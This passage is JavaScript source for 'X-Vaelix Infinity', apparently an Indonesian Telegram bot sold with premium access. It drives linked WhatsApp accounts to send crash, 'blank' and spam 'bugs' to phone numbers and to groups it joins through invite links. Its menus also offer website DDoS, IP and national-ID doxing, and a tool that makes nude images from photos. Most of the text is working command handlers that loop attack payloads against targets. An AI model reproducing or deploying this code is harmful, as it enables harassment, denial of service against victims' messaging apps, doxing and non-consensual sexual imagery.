𖥊. - /forceclick    ➜ 628xxxx
𖥊. - /Blank  ➜ 628xxxx
𖥊. - /BlankV2  ➜ 628xxxx
»»—✠——> X-Vaelix ☩ Not Spam <——✠—««
𖥊. - /buldozer   ➜ 628xxxx
𖥊  - /xfc     ➜ 628xxxx
\`\`\`
`;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

          else if (data === "erenmenu5") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Group <——✠—««
𖥊. - /delaygc    ➜ link group
𖥊. - /blankgc    ➜ link group
𖥊. - /bangc    ➜ link group
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "menuTools") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

✦••┈┈ - 𝐇𝐚𝐯𝐞𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 𝕺𝖓𝖊 - ┈┈••✦
─ #- 𝕿𝖔𝖔𝖑𝖘 𝖒𝖊𝖓𝖚° ─( 🛠 )
┃☰. - /ddoswebsite « Url »
〢-╰➤ ° ↯ Attack Website ¡
┃☰. - /fixcode « Reply Code »
〢-╰➤ ° ↯ Fixing Code Error ¡
┃☰. - /play « Song Name »
〢-╰➤ ° ↯ Search Music ¡
┃☰. - /ssiphone « Query »
〢-╰➤ ° ↯ Screenshot WhatsApp Ip ¡
┃☰. - /addfiture « Reply Code »
〢-╰➤ ° ↯ Add New Fitures ¡
┃☰. - /removebg « Reply Image »
〢-╰➤ ° ↯ Delete Baground Image ¡
┃☰. - /watermark « Reply Image »
〢-╰➤ ° ↯ Adding Watermark to Photos ¡
┃☰. - /tiktokdl « Url »
〢-╰➤ ° ↯ Download Media Tiktok ¡
┃☰. - /instagramdl « Url »
〢-╰➤ ° ↯ Download Media Instagram ¡
┃☰. - /pinterest « Query »
〢-╰➤ ° ↯ Search Image From Pinterest ¡

⧫━⟢ ႪဝઽႠႫႮႨႱႤ – ႹმჁძა ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
           { text: "𝗫𝗚𝗥𝗢𝗨𝗣",
           callback_data: "groupMenu",
           style: "danger" , icon_custom_emoji_id: "5411329291659013967" }, 
           { text: "𝗫𝗗𝗢𝗫𝗜𝗡𝗚",
           callback_data: "Doxing",
           style: "danger" , icon_custom_emoji_id: "5463343407197878047" }
          ], 
          [
           { text: "𝗫𝗧𝗢𝗢𝗟𝗦",
           callback_data: "ToolsTwo", 
           style: "primary" , icon_custom_emoji_id: "5368499186293564526" },
           { text: "𝗠𝗘𝗡𝗨 𝗔𝗗𝗗",
           callback_data: "MenuAdd", 
           style: "primary" , icon_custom_emoji_id: "5368499186293564526" }
          ], 
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main",
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "groupMenu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕲𝖗𝖚𝖕𝖒𝖊𝖓𝖚° ─( 👥 )
┃☰. - /promote « Reply Users »
〢-╰➤ ° ↯ Promote Users In Groups ¡
┃☰. - /demote « Reply Users »
〢-╰➤ ° ↯ Demote Users In Groups ¡
┃☰. - /setwelcome « Text / Photo »
〢-╰➤ ° ↯ Custom Text Welcome ¡
┃☰. - /welcome « on|off »
〢-╰➤ ° ↯ Settings On / Offline Welcome ¡
┃☰. - /kick « Reply Users »
〢-╰➤ ° ↯ Kick Users From Groups ¡
┃☰. - /warn « Reply Users »
〢-╰➤ ° ↯ Giving A Warning ¡
┃☰. - /unwarn « Reply Users »
〢-╰➤ ° ↯ Delete A Warning ¡
┃☰. - /addblocklist « Text »
〢-╰➤ ° ↯ Add Forbidden Words ¡
┃☰. - /delblocklist « Text »
〢-╰➤ ° ↯ Delete Forbidden Words ¡
┃☰. - /blocklist 
〢-╰➤ ° ↯ See All Blocklist ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞", 
            callback_data: "menuTools",
            style: "danger" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "ToolsTwo") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕿𝖔𝖔𝖑𝖘° ─( 🛠 )
┃☰. - /channel
〢-╰➤ ° ↯ Joining Channel ¡
┃☰. - /chatowner « Text »
〢-╰➤ ° ↯ Message Owner From Bot ¡
┃☰. - /sticker « Reply Image »
〢-╰➤ ° ↯ Convert Image To Sticker ¡
┃☰. - /getcode « Url »
〢-╰➤ ° ↯ Fetch HTML Code ¡
┃☰. - /enchtml - Reply File
〢-╰➤ ° ↯ Locking HTML Code ¡
┃☰. - /tourl « Reply Image »
〢-╰➤ ° ↯ Upload Image To Link ¡
┃☰. - /brat « Text »
〢-╰➤ ° ↯ Sticker Brat ¡
┃☰. - /tonaked « Reply Image »
〢-╰➤ ° ↯ To Naked Girls ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "primary" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "Doxing") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕯𝖔𝖝𝖏𝖓𝖌° ─( 🔍 )
┃☰. - /trackip « IP Adress »
〢-╰➤ ° ↯ Search Information IP Adress ¡
┃☰. - /nikparse « NIK »
〢-╰➤ ° ↯ Search Information NIK ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "TqTo") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕿𝖍𝖆𝖓𝖐𝖘 𝖙𝖔° ─( 🫀 )
┃☰. @RannNewEra 
〢-╰➤ ° ↯ ᴅᴇᴠᴇʟᴏᴘᴇʀ
┃☰. @Mylinmw
〢-╰➤ ° ↯ ꜱᴜᴘᴘᴏʀᴛ
┃☰. @Sanzxyzbca
〢-╰➤ ° ↯ ꜱᴜᴘᴘᴏʀᴛ
┃☰. @styleclaimfake

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "menu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

✦••┈┈ - 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐒𝐜𝐫𝐢𝐨𝐭 - ┈┈••✦
𖥊. - /restart => ᴍᴇʀᴇsᴛᴀʀᴛ ᴘᴀɴᴇʟ ᴏᴛᴏᴍᴀᴛɪs
𖥊. - /setcd => ᴍᴇɴɢᴀᴛᴜʀ ᴄᴏᴏʟᴅᴏᴡɴ
𖥊. - /connect => ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ sᴇɴᴅᴇʀ
𖥊. - /listbot => ᴍᴇʟɪʜᴀᴛ sᴇɴᴅᴇʀ ᴀᴋᴛɪғ
𖥊. - /lock => ᴍᴇɴɢᴜɴᴄɪ ᴄᴍᴅ ʙᴜɢs 
𖥊. - /buka => ᴍᴇᴍʙᴜᴋᴀ ᴄᴍᴅ ʙᴜɢs
𖥊. - /listlock  => ᴍᴇʟɪʜᴀᴛ ᴄᴍᴅ ᴛᴇʀᴋᴜɴᴄɪ

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "primary" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "MenuAdd") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝗠𝗘𝗡𝗨 𝗔𝗗𝗗° ─( ✚ )
┃☰. - /addgroupremium
〢-╰➤ ° ↯ Menambahkan Premium Group ¡
┃☰. - /delgroupremium
〢-╰➤ ° ↯ Menghapus Premium Group ¡
┃☰. - /cekpremiumgroup
〢-╰➤ ° ↯ Mengecek Premium Group ¡
┃☰. - /addowner 
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴏᴡɴᴇʀ ¡
┃☰. - /delowner
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴏᴡɴᴇʀ ¡
┃☰. - /addadmin
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀ ᴀᴅᴍɪɴ ¡
┃☰. - /deladmin 
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴀᴅᴍɪɴ ¡
┃☰. - /addprem
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ ¡
┃☰. - /delprem 
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴘʀᴇᴍɪᴜᴍ ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    try {
  await bot.editMessageCaption(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "MarkdownV2",
    reply_markup: replyMarkup
  });
  } catch (e) {
  await bot.editMessageText(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "MarkdownV2",
    reply_markup: replyMarkup
  }).catch(()=>{});
}

  } catch (err) {
    console.error(err);
  }
});
    
//=======CASE BUG IOS=========//

bot.onText(/\/xbugs (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xbugs"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xbugs sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xbugs`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 4; i++) {
      await CrashOverlow(target, sock);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});


function extractGroupCode(link) {
    try {
        const url = new URL(link);
        if (url.hostname !== "chat.whatsapp.com") return null;

        const parts = url.pathname.split("/").filter(Boolean);
        return parts[0] || null;
    } catch {
        return null;
    }
}
bot.onText(/^\/bangc(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const link = match?.[1]?.trim();
    const randomImage = getRandomImage();

    const cooldown = checkCooldown(senderId);
    if (cooldown) {
        return bot.sendMessage(
            chatId,
            `⏳ *Cooldown!* Tunggu ${cooldown} lagi sebelum menggunakan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    const joined = await checkJoined(senderId);
    if (!joined) {
        return bot.sendMessage(
            chatId,
            `❌ *Kamu belum join channel!*\nSilakan join dulu untuk menggunakan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!link) {
        return bot.sendMessage(
            chatId,
            `🪧 *Format:* /bannido https://chat.whatsapp.com/xxxxxx\n\n*Cara:* Kirim link undangan grup WhatsApp, bot akan otomatis join dan mengirim bug.`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractGroupCode(link);
    if (!inviteCode) {
        return bot.sendMessage(
            chatId,
            `❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.\nContoh: https://chat.whatsapp.com/abc123xyz`,
            { parse_mode: "Markdown" }
        );
    }

    if (!sock) {
        return bot.sendMessage(
            chatId,
            `❌ *Bot WhatsApp belum terhubung!*\nTunggu sampai koneksi WhatsApp siap, lalu coba lagi.`,
            { parse_mode: "Markdown" }
        );
    }

    const thumbnailURL = "https://files.catbox.moe/tq24pu.png";
    const processMsg = await bot.sendPhoto(chatId, thumbnailURL, {
        caption: `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: 🔄 Processing... (Join Grup)
⇢Command: /bannido
`,
        parse_mode: "HTML",
    });

    const processMsgId = processMsg.message_id;

    try {
        const groupJid = await sock.groupAcceptInvite(inviteCode);

        if (!groupJid) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil join grup: ${groupJid}`));

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Join Berhasil!
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );

        const totalSpam = 100;
        for (let i = 0; i < totalSpam; i++) {
            try {
                await groupBan1(sock, groupJid);
            } catch (err) {
                console.log(`⚠️ Gagal kirim bug ke grup: ${err.message}`);
            }
            await sleep(1500);
            console.log(chalk.yellow(`📱 Blank bug ke grup ${groupJid} (${i + 1}/${totalSpam})`));
        }

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Success! ${totalSpam} bug terkirim
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );
    } catch (err) {
        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;
        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        }

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: ❌ Gagal: ${errorMsg}
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );
    }
});
bot.onText(/\/forceclick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/forceclick"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forceclick sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forceclick`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Click 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 3; i++) {
      await RanModzzFC(sock,target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/Blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}

    if (commandLocks["/Blank"] === true) {
    return bot.sendMessage(chatId, "❌ Command /Blank sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /Blank`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 40; i++) {
      await BlankRan(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
